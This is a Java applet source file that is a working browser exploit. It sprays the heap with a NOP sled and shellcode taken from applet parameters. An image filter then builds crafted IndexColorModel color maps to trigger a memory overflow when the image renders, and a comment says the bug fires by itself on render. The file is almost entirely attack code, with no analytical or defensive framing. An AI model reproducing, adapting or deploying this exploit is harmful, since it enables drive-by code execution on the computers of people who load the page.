//
// $Id$
// 
// Version: $Revision$
// 

import java.awt.*;
import java.awt.image.*;
import java.nio.*;

public class AppletX extends java.applet.Applet
{
	private IntBuffer [] mem;
	private Image src, dst;
	private boolean painted = false;
	
   public void init()
     {
		  // load image
        src = getImage(getCodeBase(), "test.png");
		  
		  // wait for image to be loaded
        MediaTracker mt = new MediaTracker(this);
		  mt.addImage(src, 0);
		  try { mt.waitForAll(); } catch (InterruptedException e) { }
		  mt.removeImage(src);

		  // create our filtered version (nasty one!)
		  ImageProducer ip = src.getSource();
		  ImageFilter iflt = new BoomFilter();
		  dst = createImage(new FilteredImageSource(ip, iflt));
		  
		  try
			 {
				 mem = spray(getParameter("sc"), getParameter("np"));
				 // System.out.println("Sprayed!");
			 }
		  catch (Exception e)
			 {
			 }
		  
		  // the vuln shall trigger itself auto-magically on render...
     }
	
	public void paint(Graphics g)
	  {
		  if (!painted)
			 {
				 painted = true;
				 if (src != null)
					g.drawImage(src, 10, 10, this);
				 if (dst != null)
					g.drawImage(dst, 250, 10, this);
			 }
	  }
	
   // based on:
	// http://stackoverflow.com/questions/140131/convert-a-string-representation-of-a-hex-dump-to-a-byte-array-using-java
	public static short[] HexDecode(String s)
	  {
		  short[] data = new short[s.length()/2];
		  
		  for (int i = 0; i < s.length(); i += 2)
			 {
				 char c1 = s.charAt(i);
				 char c2 = s.charAt(i + 1);
				 
				 int comb = Character.digit(c1, 16) & 0xff;
				 comb <<= 4;
				 comb += Character.digit(c2, 16) & 0xff;
				 data[i/2] = (short)comb;
			 }
		  return data;
	  }
	
	public final IntBuffer [] spray(String sc, String np)
	  {
		  short [] sc_bytes = HexDecode(sc);
		  short [] np_bytes = HexDecode(np);
		  
		  return spray (sc_bytes, np_bytes);
	  }
	
	public final IntBuffer [] spray(short[] sc, short[] np)
	  {
		  int cnt = 50; // total 50 mb
		  int sz = 1024*1024; // 1 mb
		  int nops = (sz / 4) - (sc.length);
		  
		  IntBuffer [] ret = new IntBuffer[cnt];
		  
		  for (int bi = 0; bi < cnt; bi++)
			 {
				 IntBuffer ib = IntBuffer.allocate(sz / 4);

				 for (int i = 0; i < nops; ++i)
					ib.put((np[0]
							  | (np[1] << 8)
							  | (np[2] << 16)
							  | (np[3] << 24)));
				 // ib.put(0x90909090);
		  
				 for (int i = 0; i < sc.length; )
					ib.put((sc[i++]
							  | (sc[i++] << 8)
							  | (sc[i++] << 16)
							  | (sc[i++] << 24)));
				 ret[bi] = ib;
			 }
		  return ret;
	  }
}


class BoomFilter extends java.awt.image.ImageFilter
{
	public void setDimensions(int width, int height)
	  {
		  // System.out.println("in setDimensions");
		  consumer.setDimensions(width, height);
		  
		  // pixels...
		  int PXSZ = 100*100;
		  byte[] px = new byte[PXSZ];
		  for (int i = 0; i < PXSZ; i++)
			 px[i] = 0x00;
		  
		  // our length
		  int SZ1 = 0xff;
		  int SZ2 = 0x800;
		  ColorModel cm;
		  
		  // here we setup two color maps.
		  // the first one is used to control what values are written to in the second one.

		  int[] rgba = new int[SZ1];
		  for (int i = 0; i < SZ1; i++)
			 rgba[i] = 0xff010203 + i;
		  rgba[0x01] = 0xff020202;
		  rgba[0x24] = 0xff020203;
		  cm = new IndexColorModel(8, SZ1, rgba, 0, false, -1, DataBuffer.TYPE_BYTE);
		  consumer.setColorModel(cm);
		  
		  // trigger the bug
		  rgba = new int[SZ2];
		  // everything from the first buffer must be found to trigger the overflow
		  for (int i = 0; i < SZ1; i++)
			 rgba[i] = 0xff010203 + i;
		  rgba[0x01] = 0xff020202;
		  rgba[0x24] = 0xff020203;
		  for (int i = SZ1; i < SZ2 - 1; i += 2)
			 {
				 rgba[i] = 0xff020203;
				 rgba[i+1] = 0xff020202;
			 }
		  cm = new IndexColorModel(8, SZ2, rgba, 0, false, -1, DataBuffer.TYPE_BYTE);
		  
		  consumer.setPixels(10, 10, 10, 10, cm, px, 1, 1);
	  }
}
